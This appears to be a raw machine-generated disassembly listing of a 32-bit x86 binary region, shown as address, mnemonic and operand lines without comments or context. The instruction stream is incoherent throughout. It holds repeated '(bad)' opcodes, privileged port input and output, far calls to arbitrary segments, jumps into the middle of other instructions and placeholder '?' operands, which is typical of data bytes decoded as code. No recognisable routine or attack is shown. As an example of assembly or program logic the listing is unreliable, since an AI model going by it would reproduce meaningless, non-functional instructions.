  41617e:	mov    edi,0x350359d3
  416183:	imul   esp,DWORD PTR [edi+0x5056084f],0x8454e983
  41618d:	and    ebp,DWORD PTR [edi+ebp*1]
  416190:	cwde   
  416191:	lahf   
  416192:	add    ah,BYTE PTR [edx+0x2b]
  416195:	sub    dh,BYTE PTR [eax+0x1c]
  416198:	push   edx
  416199:	ret    
  41619a:	repnz xor bl,BYTE PTR [eax+0x47]
  41619e:	mov    WORD PTR [eax-0x68],?
  4161a1:	push   cs
  4161a2:	sbb    eax,0xa9c571c4
  4161a7:	adc    BYTE PTR [ecx+eax*4-0x76c60f59],bl
  4161ae:	lahf   
  4161af:	ror    DWORD PTR [ecx-0x36],cl
  4161b2:	jne    0x416188
  4161b4:	pusha  
  4161b5:	cwde   
  4161b6:	aam    0x6
  4161b8:	(bad)  
  4161b9:	lods   eax,DWORD PTR ds:[esi]
  4161ba:	add    BYTE PTR [edi-0x73d95bc8],dh
  4161c0:	imul   ebx,DWORD PTR [ecx],0x19
  4161c3:	retf   0x35e
  4161c6:	and    bh,BYTE PTR [edi]
  4161c8:	in     eax,0xee
  4161ca:	xor    al,0x8e
  4161cc:	jae    0x416232
  4161ce:	sar    al,cl
  4161d0:	(bad)  
  4161d1:	ins    BYTE PTR es:[edi],dx
  4161d2:	fiadd  DWORD PTR [edx-0x4bb28156]
  4161d8:	popf   
  4161d9:	ja     0x41624d
  4161db:	retf   0x411d
  4161de:	adc    eax,0x2e9d46de
  4161e3:	jns    0x41618c
  4161e5:	push   0xffffffae
  4161e7:	xrelease mov DWORD PTR [edi],ecx
  4161ea:	mov    esi,0x2e989660
  4161ef:	mov    edx,0x146305b
  4161f4:	je     0x41617b
  4161f6:	ret    0xd14c
  4161f9:	sbb    BYTE PTR [edx],0xb4
  4161fc:	push   ebp
  4161fd:	xor    eax,0xd3ba01e9
  416202:	mov    ebp,DWORD PTR [edx]
  416204:	retf   0xb3c0
  416207:	mov    ebx,0xb87b58eb
  41620c:	loope  0x4161d0
  41620e:	lahf   
  41620f:	les    esp,FWORD PTR [esi]
  416211:	jnp    0x416278
  416213:	inc    ecx
  416214:	fsubp  st(4),st
  416216:	outs   dx,DWORD PTR ds:[esi]
  416217:	rcl    BYTE PTR cs:0x3f203761,1
  41621e:	imul   edx,DWORD PTR [ebx-0x3f],0x2ab430b0
  416225:	(bad)  ds:0x5c91c7b
  41622b:	addr16 je 0x41621a
  41622e:	shl    BYTE PTR [eax],1
  416230:	adc    cl,BYTE PTR [ecx+0x7e]
  416233:	cli    
  416234:	push   edi
  416235:	(bad)  
  416237:	mov    WORD PTR [edi+ebx*2+0x12008c0a],ss
  41623e:	cmp    al,0xe4
  416240:	cmp    eax,0x2a06467d
  416245:	push   ebx
  416246:	xchg   ecx,eax
  416247:	add    BYTE PTR [ecx+eax*1],bl
  41624a:	lea    esi,[ecx-0x6c]
  41624d:	into   
  41624e:	push   cs
  41624f:	in     eax,dx
  416250:	and    esp,DWORD PTR [ecx-0x6595b423]
  416256:	adc    DWORD PTR [esi-0x6194c970],ebp
  41625c:	push   0xe6ec19db
  416261:	(bad)  
  416263:	dec    esp
  416264:	out    dx,eax
  416265:	test   al,0x2f
  416267:	adc    DWORD PTR [edx-0x15],edx
  41626a:	xor    BYTE PTR [esi],bl
  41626c:	cld    
  41626d:	sti    
  41626e:	and    ebp,esp
  416270:	call   0xd7a6:0xade45ef1
  416277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416278:	mov    ecx,0x8f45ffd6
  41627d:	dec    ecx
  41627e:	fst    DWORD PTR [eax]
  416280:	inc    ebp
  416281:	shl    DWORD PTR [edx],1
  416283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416284:	pop    ds
  416285:	mov    ah,0x85
  416287:	inc    eax
  416288:	lahf   
  416289:	iret   
  41628a:	fwait
  41628b:	or     al,BYTE PTR [esi+0x5]
  41628e:	fisttp QWORD PTR [edx-0x4e]
  416291:	std    
  416292:	into   
  416293:	ds mov bl,0xe6
  416296:	out    dx,eax
  416297:	repz mov al,0x4b
  41629a:	nop
  41629b:	popa   
  41629c:	add    eax,0xdfb681d3
  4162a1:	rcl    DWORD PTR [ecx+0x42],1
  4162a4:	push   ss
  4162a5:	xor    al,0xf9
  4162a7:	sbb    DWORD PTR [edx],ecx
  4162a9:	mov    cl,0x90
  4162ab:	mov    ds,WORD PTR [eax+0x753c8814]
  4162b1:	and    edi,DWORD PTR [ebx-0x65a99bb]
  4162b7:	push   ecx
  4162b8:	fdivr  QWORD PTR [ecx]
  4162ba:	adc    DWORD PTR ds:0xf6a5d6d2,0x70
  4162c1:	fdiv   QWORD PTR [eax-0x64c00683]
  4162c7:	test   DWORD PTR [ecx+0xc24f69c],ecx
  4162cd:	push   esp
  4162ce:	mov    ah,BYTE PTR [eax-0x3836166f]
  4162d4:	jmp    0x4162c1
  4162d6:	pop    esp
  4162d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d8:	ds xchg ecx,eax
  4162da:	dec    ebx
  4162db:	jge    0x4162d4
  4162dd:	mov    dh,0xba
  4162df:	ficomp DWORD PTR [edx+0x654a616d]
  4162e5:	mov    eax,ds:0x22a9fe7e
  4162ea:	stos   DWORD PTR es:[edi],eax
  4162eb:	(bad)  
  4162ec:	ins    DWORD PTR es:[edi],dx
  4162ed:	or     edi,DWORD PTR [edx]
  4162ef:	push   ebx
  4162f0:	icebp  
  4162f1:	push   ds
  4162f2:	xor    DWORD PTR [edi+eax*1-0x3e3dfcdc],ebp
  4162f9:	retf   
  4162fa:	stos   DWORD PTR es:[edi],eax
  4162fb:	jge    0x416373
  4162fd:	xor    DWORD PTR [edx-0x7cd0a59b],eax
  416303:	clc    
  416304:	add    bl,dh
  416306:	inc    ebx
  416307:	outs   dx,DWORD PTR ds:[esi]
  416308:	retf   
  416309:	das    
  41630a:	inc    esi
  41630b:	in     al,0x35
  41630d:	out    0x1c,al
  41630f:	sub    BYTE PTR [esi-0x7],bl
  416312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416313:	test   eax,0x43582624
  416318:	add    DWORD PTR [edi],esp
  41631a:	jmp    0x7b3:0xdd43888c
  416321:	jne    0x416318
  416323:	push   0xffffffdb
  416325:	jmp    0x4162b5
  416327:	das    
  416328:	ret    0xd770
  41632b:	test   al,0xf1
  41632d:	icebp  
  41632e:	in     eax,dx
  41632f:	gs (bad) 
  416331:	iret   
  416332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416333:	jl     0x4162be
  416335:	jo     0x41631a
  416337:	jg     0x416309
  416339:	cmp    eax,0x51f0c706
  41633e:	call   0xa9c8:0x81f1f210
  416345:	je     0x4163b1
  416347:	or     dh,bl
  416349:	rol    BYTE PTR [edi+0x29],cl
  41634c:	sub    al,BYTE PTR [eax]
  41634e:	add    BYTE PTR [ebx-0xdc4044a],ah
  416354:	sbb    eax,0xce8450f2
  416359:	fstp   TBYTE PTR [ecx-0x1b]
  41635c:	dec    eax
  41635d:	jmp    0x4d2b:0x80eb0283
  416364:	dec    ebx
  416365:	mov    ebx,0x61cb87f1
  41636a:	out    0x41,al
  41636c:	mov    BYTE PTR [esi+eiz*1-0x68259749],cl
  416373:	push   0x3c
  416375:	and    dh,bl
  416377:	shl    BYTE PTR [ebx+ecx*8-0x5b],0x77
  41637c:	mov    al,ds:0x9545dbf1
  416381:	leave  
  416382:	iret   
  416383:	inc    edx
  416384:	(bad)  
  416385:	std    
  416386:	jle    0x4163a9
  416388:	xchg   DWORD PTR [esi],ecx
  41638a:	pop    edx
  41638b:	std    
  41638c:	xor    eax,edx
  41638e:	inc    DWORD PTR [edi]
  416390:	in     al,dx
  416391:	or     dl,bh
  416393:	popf   
  416394:	std    
  416395:	scas   al,BYTE PTR es:[edi]
  416396:	ins    DWORD PTR es:[edi],dx
  416397:	clc    
  416398:	data16 test al,0x12
  41639b:	out    0x6a,al
  41639d:	stos   DWORD PTR es:[edi],eax
  41639e:	sub    al,0x75
  4163a0:	popa   
  4163a1:	cwde   
  4163a2:	push   0xfffffff0
  4163a4:	(bad)  
  4163a5:	lods   al,BYTE PTR ds:[esi]
  4163a6:	lock push 0xffffffec
  4163a9:	inc    esp
  4163aa:	inc    ebx
  4163ab:	xchg   esi,eax
  4163ac:	imul   edi,DWORD PTR [edx],0x24f4d4ae
  4163b2:	(bad)  
  4163b3:	fldenv [esi+0x5a5d55e3]
  4163b9:	lahf   
  4163ba:	xor    eax,0x93d0d1b1
  4163bf:	int3   
  4163c0:	cmp    cl,BYTE PTR [ecx-0x43]
  4163c3:	fst    DWORD PTR [ecx]
  4163c5:	xor    edx,DWORD PTR [eax]
  4163c7:	fwait
  4163c8:	stos   BYTE PTR es:[edi],al
  4163c9:	dec    eax
  4163ca:	push   edx
  4163cb:	sub    eax,0xcc2462a
  4163d0:	mov    db4,eax
  4163d3:	call   0x468c:0x569fcb6c
  4163da:	pop    ecx
  4163db:	shl    BYTE PTR [esi+edi*1-0x2756dd19],1
  4163e2:	cli    
  4163e3:	mov    ebp,0x602f11d7
  4163e8:	push   0x7b7b8562
  4163ed:	cld    
  4163ee:	nop
  4163ef:	mov    eax,DWORD PTR [esi]
  4163f1:	jb     0x4163b8
  4163f3:	sti    
  4163f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163f5:	xchg   al,dl
  4163f7:	mov    eax,0xe058cf29
  4163fc:	imul   edi,DWORD PTR [ebx-0x2d],0x4b0c71fa
  416403:	lods   eax,DWORD PTR ds:[esi]
  416404:	sbb    BYTE PTR [edi+0x7bac2a74],dh
  41640a:	inc    eax
  41640b:	mov    esi,0x52d9eb04
  416410:	fcom   DWORD PTR [ecx-0x784034c4]
  416416:	mov    dl,0xb9
  416418:	shl    DWORD PTR [ebx],0x88
  41641b:	fwait
  41641c:	cmp    eax,0x538a71bf
  416421:	dec    edx
  416422:	add    cl,BYTE PTR [edx-0x75]
  416425:	cmp    DWORD PTR [ebx+eiz*8+0x17],0xed557bac
  41642d:	mov    bh,0x9a
  41642f:	sti    
  416430:	call   0xba59de0a
  416435:	fbstp  TBYTE PTR [esi+0xb]
  416438:	xchg   ebp,eax
  416439:	arpl   si,sp
  41643b:	xor    dh,0x6f
  41643e:	jge    0x4164b5
  416440:	in     eax,dx
  416441:	sub    ecx,DWORD PTR [edi+ebx*4-0x194c72e6]
  416448:	ss mov edx,0x98d83b0
  41644e:	rcl    edx,1
  416450:	sub    al,0x94
  416452:	mov    edi,0x9be6d633
  416457:	loop   0x416448
  416459:	int    0xd1
  41645b:	icebp  
  41645c:	cli    
  41645d:	pop    edx
  41645e:	ss jnp 0x416404
  416461:	cmp    DWORD PTR [ebp-0x4a],eax
  416464:	mov    al,BYTE PTR [eax+0x1c]
  416467:	inc    esi
  416468:	mov    edi,0x3679289
  41646d:	pop    ecx
  41646e:	repz mov ah,0xbc
  416471:	sbb    DWORD PTR [ebp-0x19733129],esi
  416477:	pusha  
  416478:	fdivr  st(0),st
  41647a:	pop    ebx
  41647b:	jae    0x416408
  41647d:	xor    DWORD PTR [eax],eax
  41647f:	inc    eax
  416480:	test   al,ch
  416482:	mov    ah,BYTE PTR [ebx]
  416484:	mov    ss,WORD PTR [ecx+0x65]
  416487:	push   esi
  416488:	daa    
  416489:	mov    DWORD PTR [ecx+0x2fd12376],0xf74557d1
  416493:	jb     0x416434
  416495:	add    BYTE PTR ds:0x2b733625,ch
  41649b:	imul   eax,DWORD PTR [ebx+0x9],0x3b8d592d
  4164a2:	pushf  
  4164a3:	mov    esp,0x4e4b181d
  4164a8:	and    al,0x1b
  4164aa:	popa   
  4164ab:	outs   dx,DWORD PTR ds:[esi]
  4164ac:	mov    bl,0xb8
  4164ae:	mov    ds:0x13d37898,eax
  4164b3:	add    DWORD PTR ds:0xb2dd43f3,ecx
  4164b9:	xor    BYTE PTR [ebp-0x6a],al
  4164bc:	pop    ebp
  4164bd:	(bad)  
  4164be:	mov    dl,dh
  4164c0:	js     0x41653f
  4164c2:	add    DWORD PTR [ecx],ebp
  4164c4:	jae    0x416515
  4164c6:	ret    0xe5dd
  4164c9:	mov    ebx,0xf82a642a
  4164ce:	sub    edx,DWORD PTR [edi+0x18]
  4164d1:	xchg   esi,eax
  4164d2:	stos   DWORD PTR es:[edi],eax
  4164d3:	ins    BYTE PTR es:[edi],dx
  4164d4:	fs and dl,0xb1
  4164d8:	or     ah,BYTE PTR [ebp+ebp*4-0x53]
  4164dc:	rcr    DWORD PTR [eax],0xb7
  4164df:	int3   
  4164e0:	xchg   ebp,eax
  4164e1:	mov    ?,WORD PTR [edx+0x7ca807f9]
  4164e7:	mov    ebx,0x309ec46d
  4164ec:	pop    ebp
  4164ed:	xchg   bh,dl
  4164ef:	pop    es
  4164f0:	xlat   BYTE PTR ds:[ebx]
  4164f1:	aam    0xff
  4164f3:	aad    0x33
  4164f5:	div    DWORD PTR [ebp+0x10]
  4164f8:	stos   DWORD PTR es:[edi],eax
  4164f9:	dec    ebp
  4164fa:	fdivr  QWORD PTR [esi+0x6]
  4164fd:	(bad)  
  4164fe:	mov    esi,0xafb6d87d
  416503:	stos   DWORD PTR es:[edi],eax
  416504:	aas    
  416505:	sub    ebp,DWORD PTR [ebp-0x33]
  416508:	pop    esp
  416509:	xchg   ebp,eax
  41650a:	cs push es
  41650c:	mov    ebp,0xc1624c6d
  416511:	jbe    0x41655c
  416513:	jge    0x416581
  416515:	fidivr WORD PTR [eax-0x2]
  416518:	xchg   esi,eax
  416519:	nop
  41651a:	clc    
  41651b:	aad    0x47
  41651d:	jmp    0x41651a
  41651f:	(bad)  
  416520:	jmp    0xd4273f53
  416525:	sbb    BYTE PTR [esi+0x220cc565],ah
  41652b:	imul   edx,DWORD PTR [ebx],0xffffff9e
  41652e:	or     edx,ecx
  416530:	pop    ecx
  416531:	leave  
  416532:	in     al,dx
  416533:	mov    edi,0xfe580c59
  416538:	sti    
  416539:	in     eax,0x93
  41653b:	adc    BYTE PTR [esi-0x44d56e17],ah
  416541:	cmp    DWORD PTR [edi+0x12cc4d42],esp
  416547:	cld    
  416548:	mov    bl,0xd2
  41654a:	inc    edi
  41654b:	jbe    0x416563
  41654d:	imul   eax,DWORD PTR [edi+0x5cf5179c],0xffffffa1
  416554:	pop    eax
  416555:	loop   0x41652e
  416557:	gs fdivrp st(5),st
  41655a:	popa   
  41655b:	adc    eax,0x48609578
  416560:	out    dx,al
  416561:	aad    0x63
  416563:	cmp    BYTE PTR [edi-0x50],dh
  416566:	(bad)  [ebx]
  416568:	mov    ch,0xb9
  41656a:	scas   al,BYTE PTR es:[edi]
  41656b:	(bad)  
  41656c:	lods   eax,DWORD PTR ds:[esi]
  41656d:	sbb    eax,0x381930c4
  416572:	and    bh,BYTE PTR [eax-0x4b]
  416575:	test   DWORD PTR [ecx],0x7bd79881
  41657b:	mov    ebx,0x4528b1f7
  416580:	sub    al,0x85
  416582:	leave  
  416583:	and    BYTE PTR [edi-0x2ef2bf20],0xc0
  41658a:	aas    
  41658b:	mov    ?,WORD PTR [eax+0x3f]
  41658e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416590:	rol    BYTE PTR [ebp-0x2ed5f3a8],cl
  416596:	mov    al,ds:0xbe7dd9bb
  41659b:	fmul   QWORD PTR [eax-0x56b092c3]
  4165a1:	xchg   ebp,eax
  4165a2:	hlt    
  4165a3:	or     BYTE PTR [edi+eax*2-0x15],bh
  4165a7:	in     al,dx
  4165a8:	mov    al,0x49
  4165aa:	js     0x4165ce
  4165ac:	fst    QWORD PTR [edi+0xb0ab16b]
  4165b2:	pop    edx
  4165b3:	xchg   ebx,eax
  4165b4:	jp     0x416628
  4165b6:	add    al,BYTE PTR [esi-0x7b]
  4165b9:	jbe    0x416632
  4165bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165bc:	fisubr WORD PTR [ebx-0x6f606446]
  4165c2:	and    BYTE PTR ds:[edi],al
  4165c5:	jns    0x416578
  4165c7:	add    ah,0x66
  4165ca:	mov    cl,0x48
  4165cc:	je     0x4165c0
  4165ce:	xchg   edi,eax
  4165cf:	test   BYTE PTR [ebp+eiz*1+0x7],ah
  4165d3:	add    al,0x3c
  4165d5:	pop    esi
  4165d6:	cwde   
  4165d7:	or     ecx,DWORD PTR [ecx-0x6b1a6b36]
  4165dd:	dec    esp
  4165de:	push   ecx
  4165df:	repz dec ebp
  4165e1:	bound  eax,QWORD PTR [ebp+0x7b]
  4165e4:	xor    cl,ch
  4165e6:	out    dx,al
  4165e7:	mul    DWORD PTR [edi-0x13]
  4165ea:	outs   dx,DWORD PTR ds:[esi]
  4165eb:	sbb    al,0x4b
  4165ed:	je     0x416660
  4165ef:	sbb    BYTE PTR [esi-0x4b],dl
  4165f2:	lods   al,BYTE PTR ds:[esi]
  4165f3:	js     0x41665d
  4165f5:	repnz outs dx,DWORD PTR fs:[esi]
  4165f8:	or     eax,0xf3214d7b
  4165fd:	outs   dx,BYTE PTR ds:[esi]
  4165fe:	mov    BYTE PTR [edi],al
  416600:	mov    ds:0x5428679c,eax
  416605:	popa   
  416606:	pop    es
  416607:	ins    BYTE PTR es:[di],dx
  416609:	jb     0x4165ba
  41660b:	sbb    eax,0xce9b8d07
  416610:	pop    ss
  416611:	pop    ebx
  416612:	xor    ebp,DWORD PTR [ebx-0x36]
  416615:	fmul   DWORD PTR [edx-0x53]
  416618:	inc    esp
  416619:	fdivr  st,st(7)
  41661b:	dec    esp
  41661c:	stos   DWORD PTR es:[edi],eax
  41661d:	popa   
  41661e:	fbstp  TBYTE PTR [eax]
  416620:	pop    esi
  416621:	fsub   DWORD PTR [ecx]
  416623:	jns    0x416610
  416625:	enter  0x590d,0x47
  416629:	sbb    eax,ebx
  41662b:	stos   DWORD PTR es:[edi],eax
  41662c:	mov    bl,0xd6
  41662e:	sub    BYTE PTR [edi-0x45],bh
  416631:	mov    dl,BYTE PTR [edx]
  416633:	hlt    
  416634:	jns    0x41660f
  416636:	aaa    
  416637:	mov    ds:0x4aa9bf78,al
  41663c:	stos   BYTE PTR es:[di],al
  41663e:	jmp    0x26a288dc
  416643:	fdiv   DWORD PTR [edx]
  416645:	or     bh,BYTE PTR [ecx-0x66171c88]
  41664b:	mov    edi,DWORD PTR [edx-0x34]
  41664e:	imul   eax,DWORD PTR [esi+0x32555fe9],0xffffffef
  416655:	icebp  
  416656:	fidivr WORD PTR [ecx+0x72]
  416659:	das    
  41665a:	add    al,0x51
  41665c:	stc    
  41665d:	cwde   
  41665e:	sbb    bh,BYTE PTR [ebx-0x72]
  416661:	lock mov al,0x54
  416664:	stos   DWORD PTR es:[edi],eax
  416665:	push   0x28f1d4d5
  41666a:	fild   WORD PTR [ebp+0x36]
  41666d:	mov    BYTE PTR es:[esi+0x58],0x7f
  416672:	jns    0x4166a8
  416674:	dec    esi
  416675:	sub    DWORD PTR [edx-0x2d96eb34],ecx
  41667b:	or     ah,bh
  41667d:	in     eax,0xb3
  41667f:	mov    DWORD PTR fs:[esi+0x1a],edx
  416683:	je     0x416693
  416685:	push   ss
  416686:	sbb    DWORD PTR [edi],edx
  416688:	not    BYTE PTR [edx+ebp*2-0x4f]
  41668c:	lock out 0xca,al
  41668f:	popf   
  416690:	into   
  416691:	loopne 0x41670e
  416693:	(bad)  
  416694:	mov    ds:0x9dcd1916,al
  416699:	mov    ah,0x40
  41669b:	rol    DWORD PTR es:[esp+esi*2-0xcf3ce0],cl
  4166a3:	ins    BYTE PTR es:[edi],dx
  4166a4:	push   ecx
  4166a5:	jno    0x41668a
  4166a7:	and    edi,DWORD PTR [ecx+0x5b]
  4166aa:	pop    ebx
  4166ab:	sub    cl,BYTE PTR [ebx+0x2]
  4166ae:	into   
  4166af:	mov    BYTE PTR [ebp-0x7218bfc7],ah
  4166b5:	xor    DWORD PTR [ebx-0x2a3c7835],0xffffffc5
  4166bc:	xor    DWORD PTR ds:0x23600707,edi
  4166c2:	xchg   BYTE PTR [edx+edx*2],dh
  4166c5:	call   0xd8c7:0xe71970e2
  4166cc:	into   
  4166cd:	int    0xd0
  4166cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166d0:	in     eax,dx
  4166d1:	nop
  4166d2:	cld    
  4166d3:	es loop 0x416700
  4166d6:	fadd   QWORD PTR [eax]
  4166d8:	sbb    DWORD PTR [ebx+0x4dcc8a40],0xffffffe2
  4166df:	dec    ecx
  4166e0:	cmp    ah,BYTE PTR [ecx-0x41e21388]
  4166e6:	sbb    al,0x27
  4166e8:	mov    ds:0xda58e091,al
  4166ed:	imul   esi,esp,0x55
  4166f0:	lods   eax,DWORD PTR ds:[esi]
  4166f1:	popa   
  4166f2:	xchg   ebx,eax
  4166f3:	push   esp
  4166f4:	and    DWORD PTR [esp+eax*8-0x7ecd5a0a],ebp
  4166fb:	and    edx,DWORD PTR [esi-0x17]
  4166fe:	bound  esi,QWORD PTR [ecx+edx*2-0x22]
  416702:	sub    bl,dh
  416704:	jecxz  0x41673a
  416706:	mov    ebx,0x273fbc10
  41670b:	mov    ebx,0xc9820652
  416710:	inc    ebp
  416711:	push   ebp
  416712:	xchg   esp,eax
  416713:	mov    ebx,0xd439f4f0
  416718:	inc    esp
  416719:	inc    ecx
  41671a:	push   esi
  41671b:	xor    DWORD PTR [ecx],0xffffff8f
  41671e:	pop    esp
  41671f:	dec    ebx
  416720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416721:	imul   ebx,DWORD PTR [edi],0xffffffa0
  416724:	pop    edi
  416725:	sub    DWORD PTR [ebx],ecx
  416727:	ss push 0xffffffdb
  41672a:	pushf  
  41672b:	gs cmp edi,ebp
  41672e:	inc    edx
  41672f:	cwde   
  416730:	out    dx,eax
  416731:	out    0x79,eax
  416733:	mov    DWORD PTR [edx+0x6b],0xdf36bdd5
  41673a:	scas   eax,DWORD PTR es:[edi]
  41673b:	push   ebx
  41673c:	push   ebx
  41673d:	mov    ch,0x79
  41673f:	sub    ch,BYTE PTR [esi+0x2d]
  416742:	xchg   ecx,eax
  416743:	pop    edx
  416744:	cmc    
  416745:	aaa    
  416746:	das    
  416747:	bound  ebp,QWORD PTR [edx]
  416749:	push   ss
  41674a:	mov    di,0x5902
  41674e:	mov    cl,bl
  416750:	repz (bad) 
  416752:	cwde   
  416753:	jg     0x4167c2
  416755:	lahf   
  416756:	lahf   
  416757:	xchg   esi,eax
  416758:	in     eax,dx
  416759:	sti    
  41675a:	test   BYTE PTR [ecx-0x1d],ah
  41675d:	push   0xffffff9d
  41675f:	push   edi
  416760:	imul   edi,DWORD PTR [esi],0x91272eb1
  416766:	xlat   BYTE PTR ds:[ebx]
  416767:	xor    al,0xa2
  416769:	pop    esp
  41676a:	cmp    DWORD PTR [edi-0x6e],eax
  41676d:	mov    al,BYTE PTR [edi]
  41676f:	test   al,0x67
  416771:	test   DWORD PTR [edx],edx
  416773:	push   ebp
  416774:	mov    BYTE PTR [edx+0x3a353825],cl
  41677a:	mov    DWORD PTR cs:[edi+eiz*8-0x164a2f76],0xc809ca39
  416786:	xchg   esp,eax
  416787:	call   0x586f:0xf89611e0
  41678e:	inc    edx
  41678f:	loopne 0x4167b3
  416791:	(bad)  
  416792:	fbld   TBYTE PTR [edi+0x73]
  416795:	retf   
  416796:	mov    ds:0xdcf25a28,al
  41679b:	pop    edi
  41679c:	inc    ebp
  41679d:	push   esp
  41679e:	fwait
  41679f:	ret    
  4167a0:	sbb    eax,0xbb787f8e
  4167a5:	int    0xf7
  4167a7:	mov    ch,0x37
  4167a9:	adc    al,0x93
  4167ab:	fnsave [eax]
  4167ad:	inc    edi
  4167ae:	jg     0x416768
  4167b0:	and    al,BYTE PTR [ebx+0x65]
  4167b3:	mov    eax,ds:0xbbd53f14
  4167b8:	sar    DWORD PTR [ebx-0x16],0x78
  4167bc:	cmp    esi,DWORD PTR ds:0xa051d5fb
  4167c2:	xor    DWORD PTR ds:0xdbad687c,edx
  4167c8:	mov    ah,al
  4167ca:	jo     0x416813
  4167cc:	sub    ecx,DWORD PTR ds:0x2221beec
  4167d2:	repz out dx,al
  4167d4:	add    al,0x83
  4167d6:	arpl   WORD PTR [eax],bp
  4167d8:	add    DWORD PTR ds:0xb8194f6d,edx
  4167de:	fwait
  4167df:	pop    ecx
  4167e0:	popa   
  4167e1:	pop    es
  4167e2:	outs   dx,DWORD PTR ds:[esi]
  4167e3:	popf   
  4167e4:	cdq    
  4167e5:	addr16 sub dh,cl
  4167e8:	sti    
  4167e9:	loopne 0x416843
  4167eb:	sub    eax,DWORD PTR [eax+eax*2]
  4167ee:	cli    
  4167ef:	xchg   esp,eax
  4167f0:	adc    bl,bh
  4167f2:	jp     0x4167c3
  4167f4:	inc    edi
  4167f5:	fwait
  4167f6:	dec    esi
  4167f7:	adc    BYTE PTR [ecx+edi*4],al
  4167fa:	imul   ecx,DWORD PTR [ebx+0x7],0x7d
  4167fe:	mov    bh,0x49
  416800:	fsubr  DWORD PTR [edi-0x5]
  416803:	daa    
  416804:	outs   dx,BYTE PTR ds:[esi]
  416805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416806:	scas   al,BYTE PTR es:[edi]
  416807:	(bad)  
  416808:	mov    edi,0xecb2f1c3
  41680d:	ret    0x403e
  416810:	cmp    al,0x1d
  416812:	ds mov eax,0x5047a238
  416818:	shl    BYTE PTR [ebx+0x42],0x7a
  41681c:	mov    BYTE PTR [esi],dl
  41681e:	ret    0x2955
  416821:	xlat   BYTE PTR ds:[ebx]
  416822:	repnz and al,0x30
  416825:	add    al,0x69
  416827:	test   bl,0xca
  41682a:	dec    esp
  41682b:	push   esi
  41682c:	stos   BYTE PTR es:[edi],al
  41682d:	pop    es
  41682e:	sub    ebp,0xffffffc9
  416831:	ret    0x64c3
  416834:	fisttp DWORD PTR [ebx+0xbab6fa]
  41683a:	loopne 0x41680f
  41683c:	idiv   WORD PTR ds:0x49d9c595
  416843:	add    BYTE PTR [edi+0x2afc76f2],0x70
  41684a:	jno    0x41684b
  41684c:	push   esp
  41684d:	data16 xor BYTE PTR [edx],bl
  416850:	loop   0x41689c
  416852:	(bad)  
  416853:	jecxz  0x41681d
  416855:	cmp    ebp,DWORD PTR ss:[esi+0x2ace071a]
  41685c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41685d:	fidiv  DWORD PTR [ebx]
  41685f:	ss push ss
  416861:	(bad)  
  416863:	dec    ebp
  416864:	mov    esi,0x13437046
  416869:	ins    DWORD PTR es:[edi],dx
  41686a:	or     al,al
  41686c:	clc    
  41686d:	popf   
  41686e:	pop    ebp
  41686f:	add    eax,0xd07b42ce
  416874:	push   0x46716425
  416879:	adc    ch,BYTE PTR [eax+eiz*1]
  41687c:	out    0xef,eax
  41687e:	add    eax,0x9980fc4c
  416883:	sub    BYTE PTR [esi+0x573236e0],bl
  416889:	add    eax,0xf9ca629c
  41688e:	loope  0x41683f
  416890:	add    ch,dh
  416892:	and    DWORD PTR [ecx+edi*2+0x21695ce9],0x1c
  41689a:	mov    cl,0xa4
  41689c:	adc    BYTE PTR [ecx+0x11],bl
  41689f:	mov    ah,0x61
  4168a1:	inc    esp
  4168a2:	add    DWORD PTR [ecx+ecx*2-0xb],ebp
  4168a6:	adc    esp,DWORD PTR [ebx+0x1aacb7b4]
  4168ac:	mov    ds:0x51691c0,al
  4168b1:	mov    ds:0xa4806058,al
  4168b6:	mov    ds:0x8acd46f8,al
  4168bb:	mov    ds:0x8413991,al
  4168c0:	or     ebp,ebx
  4168c2:	sbb    al,0xf4
  4168c4:	jp     0x416928
  4168c6:	fs jecxz 0x4168be
  4168c9:	test   DWORD PTR [edx+0xf],0x5159e63b
  4168d0:	rol    esi,cl
  4168d2:	iret   
  4168d3:	lods   al,BYTE PTR ds:[esi]
  4168d4:	or     al,0x8e
  4168d6:	add    esp,DWORD PTR ss:[esi+eiz*4+0x3a]
  4168db:	dec    edi
  4168dc:	lods   al,BYTE PTR ds:[esi]
  4168dd:	xchg   esp,eax
  4168de:	imul   eax,DWORD PTR [esi-0x1f9e4684],0xfffffff7
  4168e5:	cmp    eax,0x40afa2c6
  4168ea:	(bad)  
  4168eb:	hlt    
  4168ec:	(bad)  
  4168ed:	push   ebx
  4168ee:	and    DWORD PTR [esp+ebx*2-0x7],0x70b1541d
  4168f6:	call   0x21f9:0xe5f0ee11
  4168fd:	pop    ds
  4168fe:	xchg   edi,eax
  4168ff:	push   ebp
  416900:	icebp  
  416901:	or     al,0x1c
  416903:	mov    esp,0xd76e142
  416908:	sahf   
  416909:	dec    ebx
  41690a:	add    al,0xaa
  41690c:	icebp  
  41690d:	xor    eax,0x97c8d15e
  416912:	jl     0x41689d
  416914:	pusha  
  416915:	stc    
  416916:	push   es
  416917:	rol    esp,cl
  416919:	xchg   edi,eax
  41691a:	fisub  WORD PTR [esi]
  41691c:	jmp    0x2985:0x94592d7d
  416923:	retf   
  416924:	mov    edx,0x49d138fd
  416929:	xor    BYTE PTR [esi+eax*8+0x6523945b],0x41
  416931:	ret    
  416932:	sub    BYTE PTR [ebx-0x172204b6],cl
  416938:	cmp    eax,0x71900574
  41693d:	dec    ebx
  41693e:	inc    ebp
  41693f:	sub    dl,BYTE PTR [edx+0x15b5f9a1]
  416945:	mov    al,0xec
  416947:	mov    cl,0xb2
  416949:	adc    DWORD PTR [eax+0x32feb42e],0x67
  416950:	out    dx,eax
  416951:	dec    ecx
  416952:	popf   
  416953:	aam    0x7a
  416955:	xchg   ebp,eax
  416956:	adc    al,0x35
  416958:	out    dx,eax
  416959:	sahf   
  41695a:	inc    edi
  41695b:	pop    edx
  41695c:	and    al,0x5f
  41695e:	jl     0x41693d
  416960:	jg     0x4169d8
